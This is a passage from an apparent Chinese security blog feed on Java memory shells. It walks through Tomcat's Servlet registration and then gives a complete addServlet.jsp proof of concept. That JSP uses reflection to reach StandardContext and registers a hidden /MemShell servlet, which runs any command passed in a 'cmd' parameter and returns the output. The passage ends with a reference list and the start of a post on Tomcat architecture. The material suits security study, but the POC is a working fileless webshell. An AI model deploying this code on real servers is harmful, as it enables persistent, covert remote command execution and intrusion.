title="断点调试："></a>断点调试：</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516206.png" alt="img"></p><p>此处的 WebXml 和 StandardContext 是 Servlet 注册所需的配置</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515854.png" alt="img"></p><p>继续跟到创建 wrapper：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516930.png" alt="img"></p><p>根据 StandardContext 的内容创建 StandardWrapper，将 Servlet 放入 wrapper 中</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516538.png" alt="img"></p><p><strong>LoadOnStartup</strong> 是 Servlet 的启动顺序配置</p><p>在 web.xml 中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Servlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.Servlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 立即加载 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LazyServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.LazyServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 延迟加载 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong>正数</strong>：启动时按数值顺序初始化</li><li><strong>0 或正数</strong>：应用启动时立即初始化</li><li><strong>负数</strong>：第一次请求时才初始化</li><li><strong>未设置</strong>：默认第一次请求时初始化</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515552.png" alt="img"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">wrapper</span>.setName(servlet.getServletName());<br></code></pre></td></tr></table></figure><p>给 wrapper 设置一个名字</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516381.png" alt="img"></p><p>从创建 wrapper 时获取 servletName</p><p>servletName&#x3D;”default”（这些是系统内置的，需要跳过之后，获取到我们写好的）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515376.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516901.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515652.png" alt="img"></p><p>此时获取的 Name 为 ServletTest</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516380.png" alt="img"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">wrapper</span>.setServletClass(servlet.getServletClass());<br></code></pre></td></tr></table></figure><p>获取全类名</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515705.png" alt="img"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">context.addChild(<span class="hljs-keyword">wrapper</span>);<br></code></pre></td></tr></table></figure><p>将 wrapper 放入 context </p><p>这一步相当于 web.xml 中的：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.src.tomcatdemo.ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081517485.png" alt="img"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">context.addServletMappingDecoded(<span class="hljs-keyword">entry</span>.getKey(), <span class="hljs-keyword">entry</span>.getValue());<br></code></pre></td></tr></table></figure><p>获取 Servlet 的 URL 映射</p><p>执行 web.xml 中的：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/servlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>目前依旧是系统内置的 jsp </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515796.png" alt="img"></p><p>获取到我们前面写的恶意类</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081517951.png" alt="img"></p><h4 id="总结一下注册的大致流程："><a href="#总结一下注册的大致流程：" class="headerlink" title="总结一下注册的大致流程："></a>总结一下注册的大致流程：</h4><ol><li>创建一个包装器 wrapper</li><li>获取 Servlet 名字</li><li>获取 Servlet 类</li><li>将 wrapper 加入 context</li><li>获取 URL 映射</li></ol><h3 id="2-3-写恶意类"><a href="#2-3-写恶意类" class="headerlink" title="2.3 写恶意类"></a>2.3 写恶意类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%--<br>Created by IntelliJ IDEA.<br>User: XVSHIFU<br>Date: <span class="hljs-number">2025</span>/<span class="hljs-number">10</span>/<span class="hljs-number">31</span><br>Time: <span class="hljs-number">13</span>:08<br>To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515253.png" alt="img"></p><h3 id="2-4-注册进-tomcat"><a href="#2-4-注册进-tomcat" class="headerlink" title="2.4 注册进 tomcat"></a>2.4 注册进 tomcat</h3><p>写好马后，第二步就是动态注册 servlet</p><h4 id="第一步：获取-standardContext"><a href="#第一步：获取-standardContext" class="headerlink" title="第一步：获取 standardContext"></a>第一步：获取 standardContext</h4><p>在 jsp 中有一个 request 对象，这个对象中存在一个 getServletContext 方法，会获取 servletContext</p><p>动态调试，找到 request 对象获取的 servletContext 中存在 StandardContext</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515306.png" alt="img"></p><p>接下来就利用反射获取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">ServletContext servletContext = request.getServletContext();<br><br>Field applicationContextFiled = servletContext.getClass().getDeclaredField(&quot;context&quot;);<br>applicationContextFiled.setAccessible(true);<br>ApplicationContext applicationContext = (ApplicationContext) applicationContextFiled.get(servletContext);<br><br>Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);<br>standardContextField.setAccessible(true);<br>StandardContext context = (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><h4 id="第二步：注册到-context"><a href="#第二步：注册到-context" class="headerlink" title="第二步：注册到 context"></a>第二步：注册到 context</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">//创建一个 wrapper<br>Wrapper wrapper = context.createWrapper();<br><br>//设置名字<br>wrapper.setName(&quot;MemServlet&quot;);<br><br>//获取全类名<br>wrapper.setServletClass(MemServlet.class.getName());<br><br>//实例化 MemServlet 类<br>wrapper.setServlet(new MemServlet());<br><br>//放进 context<br>context.addChild(wrapper);<br><br>//设置路径和类名<br>context.addServletMappingDecoded(&quot;/MemShell&quot;,&quot;MemServlet&quot;);<br></code></pre></td></tr></table></figure><h4 id="完整的-POC：addServlet-jsp"><a href="#完整的-POC：addServlet-jsp" class="headerlink" title="完整的 POC：addServlet.jsp"></a>完整的 POC：addServlet.jsp</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;&lt;%--<br>Created by IntelliJ IDEA.<br>User: XVSHIFU<br>Date: <span class="hljs-number">2025</span>/<span class="hljs-number">10</span>/<span class="hljs-number">31</span><br>Time: <span class="hljs-number">13</span>:08<br>To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 计算机弹出</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-comment">// MemShell?cmd=whoami  任意命令执行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br><br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>                String line;<br>                <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                    res.getWriter().println(line);<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>%&gt;<br><br>&lt;%<br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextFiled</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextFiled.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><span class="hljs-comment">//创建一个 wrapper</span><br><span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br><br><span class="hljs-comment">//设置名字</span><br>wrapper.setName(<span class="hljs-string">&quot;MemServlet&quot;</span>);<br><br><span class="hljs-comment">//获取全类名</span><br>wrapper.setServletClass(MemServlet.class.getName());<br><br><span class="hljs-comment">//实例化 MemServlet 类</span><br>wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MemServlet</span>());<br><br><span class="hljs-comment">//放进 context</span><br>context.addChild(wrapper);<br><br><span class="hljs-comment">//设置路径和类名</span><br>context.addServletMappingDecoded(<span class="hljs-string">&quot;/MemShell&quot;</span>,<span class="hljs-string">&quot;MemServlet&quot;</span>);<br><br><br>%&gt;<br><br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="2-5-利用"><a href="#2-5-利用" class="headerlink" title="2.5 利用"></a>2.5 利用</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515170.png" alt="img"></p><p>先去访问传上去的 addServlet.jsp  来创建一个 Servlet</p><p>此时 MemServlet 已经写入了内存</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081517655.png" alt="img"></p><p>通过路径 &#x2F;MemShell 访问：弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515251.png" alt="img"></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://www.cnblogs.com/rebeyond/p/9686213.html">【原创】利用“进程注入”实现无文件不死webshell</a></p><p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p><p><a href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Spring内存马 | CurlySean’s Blog</a></p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agent实现反序列化注入内存shell</a></p><p><a href="https://su18.org/post/memory-shell/">JavaWeb 内存马一周目通关攻略 | 素十八</a></p><p><a href="https://su18.org/post/memory-shell-2/">JavaWeb 内存马二周目通关攻略 | 素十八</a></p><p><a href="https://www.4hou.com/posts/zlkq">Shell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p><p><a href="https://www.freebuf.com/articles/web/433972.html">Java内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户</a></p><p><a href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客</a></p><p><a href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Spring型内存马分析</a></p><p><a href="https://www.runoob.com/servlet/servlet-intro.html">Servlet 简介 | 菜鸟教程</a></p><p><a href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Spring内存马学习</a></p><p><a href="https://xz.aliyun.com/news/11493">Spring内存马——Controller&#x2F;Interceptor构造</a></p><p>[基础篇 - Javassist 使用指南](<a href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> 安全&#x2F;基础篇-javassist用法指南&#x2F;)</p><p><a href="https://goodapple.top/archives/1145#header-id-20">Java安全学习——ROME反序列化 - 枫のBlog</a> （使用Javassist缩短恶意class）</p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agent实现反序列化注入内存shell</a></p><p><a href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agent内存马 | CurlySean’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>内存马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 内存马第一篇 - 基础</title>
    <link href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%80%E7%AF%87%20-%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%80%E7%AF%87%20-%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-内存马第一篇-基础"><a href="#Java-内存马第一篇-基础" class="headerlink" title="Java 内存马第一篇 - 基础"></a>Java 内存马第一篇 - 基础</h1><h1 id="一、基础："><a href="#一、基础：" class="headerlink" title="一、基础："></a>一、基础：</h1><h2 id="1-什么是内存马"><a href="#1-什么是内存马" class="headerlink" title="1. 什么是内存马"></a>1. 什么是内存马</h2><p>无文件的 webshell</p><blockquote><p><font style="color:rgb(0, 0, 0);">内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识</font><font style="color:rgb(0, 0, 0);">别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。</font></p></blockquote><h2 id="2-内存马分类："><a href="#2-内存马分类：" class="headerlink" title="2. 内存马分类："></a>2. 内存马分类：</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506693.png"></p><h2 id="3-Tomcat-基础"><a href="#3-Tomcat-基础" class="headerlink" title="3. Tomcat 基础"></a>3. Tomcat 基础</h2><h3 id="3-1-Tomcat-架构"><a href="#3-1-Tomcat-架构" class="headerlink" title="3.1 Tomcat 架构"></a>3.1 Tomcat 架构</h3><h4 id="3-1-1-Tomcat-架构"><a href="#3-1-1-Tomcat-架构" class="headerlink" title="3.1.1 Tomcat 架构"></a>3.1.1 Tomcat 架构</h4><p><strong><font style="color:rgb(51, 51, 51);">Tomcat 是Web应用服务器,是一个Servlet&#x2F;JSP容器</font></strong><font style="color:rgb(51, 51, 51);">，基本框架如下图所示，主要有server、service、connector、container。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508073.jpeg"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506316.jpeg"></p><p><strong>Server：</strong></p><p>代表整个 Tomcat 服务器。</p><p>一个 Tomcat 只有一个 Server，Server 中包含至少一个 Service 组件。</p><p><strong>Service：</strong></p><p>Service 主要是为了关联 Connector 和 Container，同时会初始化它下面的其它组件，在 Connector 和 Container 外面多包一层，把它们组装在一起，向外面提供服务，</p><p>一个 Service 可以设置多个 Connector，但只能有一个 Container 容器。</p><p><strong>Connector：</strong></p><p>Connector 负责接收浏览器发过来的 tcp 连接请求，创建一个 Request 和 Response 对象分别用于和请求端交换数据，然后会产生一个线程来处理这个请求并把产生的 Request 和 Response 对象传给处理这个请求的线程。这里Tomcat中一个Connector对应了一个请求，所以service容器中可以同时有多个connector对象。</p><p>简单来说就是Connector将在某个指定的端口上来监听客户的请求，将 socket 连接封装成 request 和 response 对象，后续交给 Container （Engine）来处理，并从Engine处获得响应并返回给客户端。<br><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508086.jpeg"></p><p>Connector是使用protocolHandler来处理具体的请求（不同的protocolHandler代表不同的连接类型）。</p><p>而每种protocolHandler都使用了各自的3个重要组件来具体处理请求：</p><p>-Endpoint：用于处理底层Socket连接（nio和nio2实现的是TCP&#x2F;IP协议，Apr实现的是SSL&#x2F;TLS协议）；</p><p>-Processer：用于将Endpoint接收到的Socket封装成Request（实现HTTP协议或websocket协议或AJP协议）；</p><p>-Adapter：用于将封装好的Request交给Container（将请求适配到servlet容器）。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507251.jpeg"></p><p><strong><font style="color:rgb(51, 51, 51);">Container（又名Catalina）：</font></strong></p><p><font style="color:rgb(51, 51, 51);">Container容器则是负责封装和管理Servlet 处理用户的servlet请求，并返回对象给web用户的模块。</font></p><p><font style="color:rgb(51, 51, 51);">Tomcat中有四种类型的Servlet容器，从上到下分别是 Engine、Host、Context、Wrapper。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507920.jpeg"></p><p>Engine：表示整个 Catalina 的 Servlet 引擎，用来管理多个虚拟站点，一个 Service 最多只能有一Engine，但是一个引擎可包含多个 Host；</p><p>Host：代表一个虚拟主机，或者说一个站点，可以给 Tomcat 配置多个虚拟主机地址，而一个虚拟主机下可包含多个 Context；</p><p>Context：表示一个 Web 应用程序，每一个Context都有唯一的path，一个Web应用可包含多个 Wrapper；</p><p>Wrapper：表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等</p><h4 id="3-1-2-Tomcat和Servlet的关系"><a href="#3-1-2-Tomcat和Servlet的关系" class="headerlink" title="3.1.2 Tomcat和Servlet的关系"></a><font style="color:rgba(0, 0, 0, 0.85);">3.1.2 Tomcat和Servlet的关系</font></h4><p><strong>Tomcat 是Web应用服务器，是一个Servlet&#x2F;JSP容器</strong>，而Servlet容器从上到下分别是 